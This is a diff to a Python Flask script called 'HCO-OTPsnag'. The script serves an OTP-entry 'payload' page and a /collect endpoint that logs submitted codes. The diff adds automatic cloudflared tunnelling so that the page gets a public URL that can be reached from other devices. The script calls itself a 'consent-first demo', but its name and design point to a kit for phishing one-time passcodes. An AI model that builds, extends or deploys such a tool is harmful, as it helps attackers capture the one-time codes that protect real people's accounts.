@@ -1,18 +1,22 @@
 #!/usr/bin/env python3
 """
-HCO-OTPsnag — Consent-first demo
+HCO-OTPsnag — Consent-first demo with optional cloudflared automation
 
-Flow:
-1. Prints a message and opens your YouTube channel in the system browser.
-2. Waits 8 seconds.
-3. Prints the big red box with green text ("HCO OTP Snag / by Azhar").
-4. Starts a Flask server that serves /payload (consent-first OTP form) and /collect to receive submissions.
-Use cloudflared/ngrok to expose the server if you want to open the page from another device.
+Usage:
+    python3 main.py         # will try to auto-launch cloudflared if available
+    python3 main.py --no-cf # skip attempting cloudflared
+
+Notes:
+- If cloudflared is installed and in PATH, the script will spawn it and attempt to parse the public URL.
+- If cloudflared is not installed, the server still runs locally at http://127.0.0.1:PORT/payload
 """
-
 import os
 import time
 import webbrowser
+import argparse
+import subprocess
+import threading
+import re
 from flask import Flask, request, render_template_string, jsonify
 from datetime import datetime
 
@@ -29,6 +33,61 @@ HERE = os.path.dirname(os.path.abspath(__file__))
 with open(os.path.join(HERE, "payload.html"), "r", encoding="utf-8") as f:
     PAYLOAD_HTML = f.read()
 
+# ---- cloudflared helper ----
+def find_cloudflared_in_path():
+    try:
+        subprocess.run(["cloudflared","--version"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        return True
+    except Exception:
+        return False
+
+def start_cloudflared_and_get_url(port, timeout=20):
+    """
+    Start cloudflared as a subprocess and parse stdout/stderr for the public URL.
+    Returns (process, public_url_or_None)
+    If unable to find URL within timeout, returns (process, None).
+    """
+    cmd = ["cloudflared", "tunnel", "--url", f"http://localhost:{port}"]
+    try:
+        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)
+    except Exception as e:
+        print("[!] Failed to start cloudflared:", e)
+        return None, None
+
+    url_holder = {"url": None}
+    pattern = re.compile(r"https?://[^\s]*trycloudflare\.com[^\s]*", re.IGNORECASE)
+
+    def reader():
+        try:
+            for line in proc.stdout:
+                line = line.strip()
+                if not line:
+                    continue
+                # print cloudflared output as it comes, but keep it subtle
+                print("[cloudflared] " + line)
+                # try to find trycloudflare URL
+                m = pattern.search(line)
+                if m:
+                    url_holder["url"] = m.group(0)
+                    break
+        except Exception:
+            pass
+
+    t = threading.Thread(target=reader, daemon=True)
+    t.start()
+
+    # wait up to timeout seconds for url to appear
+    waited = 0
+    while waited < timeout:
+        if url_holder["url"]:
+            return proc, url_holder["url"]
+        time.sleep(0.5)
+        waited += 0.5
+
+    # timed out, but process is still running
+    return proc, url_holder["url"]
+
+# ---- Terminal UI and logging ----
 def print_red_box():
     # red background / bold green text inside ASCII box (ANSI)
     RED_BG = "\033[41m"
@@ -62,6 +121,7 @@ def log_submission(data):
     print("  Time (UTC):", datetime.utcnow().isoformat() + "Z")
     print("--------------------------------------------------\n")
 
+# ---- Flask routes ----
 @app.route("/")
 def index():
     return "<h3>HCO-OTPsnag — Consent-first demo. Visit /payload (consent required)</h3>"
@@ -102,24 +162,67 @@ def collect():
     # Respond and optionally redirect client to your YouTube or a thank you page
     return jsonify({"status":"ok","message":"Thank you — consented OTP recorded (masked)."}), 200
 
+# ---- Main flow ----
 def main():
+    parser = argparse.ArgumentParser()
+    parser.add_argument("--no-cf", action="store_true", help="Do not attempt to launch cloudflared")
+    args = parser.parse_args()
+
     # 1) Show message and open YouTube for 8 seconds
     print("This tool is not free. Redirecting to YouTube in 8 seconds...")
     try:
         webbrowser.open(YOUTUBE_URL)
     except Exception:
-        # If webbrowser couldn't open (Termux environment may not), just print the URL for manual open
         print("Open this URL in your browser:", YOUTUBE_URL)
     time.sleep(8)
 
     # 2) Print red box with green text
     print_red_box()
 
-    # 3) Start Flask server
+    # 3) Optionally attempt to start cloudflared
+    cf_proc = None
+    public_url = None
+    if not args.no_cf:
+        if find_cloudflared_in_path():
+            print("[*] cloudflared detected — attempting to start tunnel and fetch public URL...")
+            cf_proc, public_url = start_cloudflared_and_get_url(PORT, timeout=25)
+            if public_url:
+                print(f"[+] cloudflared public URL: {public_url}/payload")
+            else:
+                print("[!] cloudflared started but public URL was not found in output within timeout.")
+                print("    The process may still be running; check cloudflared output above.")
+        else:
+            print("[!] cloudflared not found in PATH.")
+            print("    To install cloudflared on Termux/Android follow these general steps (example):")
+            print("    1) Download the cloudflared binary for your architecture from Cloudflare (arm/arm64).")
+            print("    2) chmod +x cloudflared && mv cloudflared /data/data/com.termux/files/usr/bin/")
+            print("    Or install via package manager if available. After installing, re-run this script.")
+            print("    You can also use ngrok as an alternative and expose http://127.0.0.1:%d/payload" % PORT)
+
+    # 4) Start Flask server and show endpoint info
+    host_display = "127.0.0.1" if HOST == "0.0.0.0" else HOST
     print(f"[*] Starting server on {HOST}:{PORT}")
-    print(f"[*] Open the payload on your device (or expose with cloudflared/ngrok): http://{HOST if HOST!='0.0.0.0' else '127.0.0.1'}:{PORT}/payload")
-    print("Tip: to test from another device use cloudflared or ngrok to create a public URL for /payload.")
-    app.run(host=HOST, port=PORT)
+    if public_url:
+        print(f"[*] Public payload URL (open on your other device): {public_url}/payload")
+    else:
+        local_url = f"http://{host_display}:{PORT}/payload"
+        print(f"[*] Open the payload on your device or other device via tunnel: {local_url}")
+    print("Tip: to test from another device use cloudflared/ngrok to create a public URL for /payload.")
+
+    try:
+        app.run(host=HOST, port=PORT)
+    finally:
+        # clean up cloudflared process if we started it
+        if cf_proc:
+            try:
+                print("[*] Shutting down cloudflared...")
+                cf_proc.terminate()
+                cf_proc.wait(timeout=5)
+            except Exception:
+                try:
+                    cf_proc.kill()
+                except Exception:
+                    pass
 
 if __name__ == "__main__":
     main()
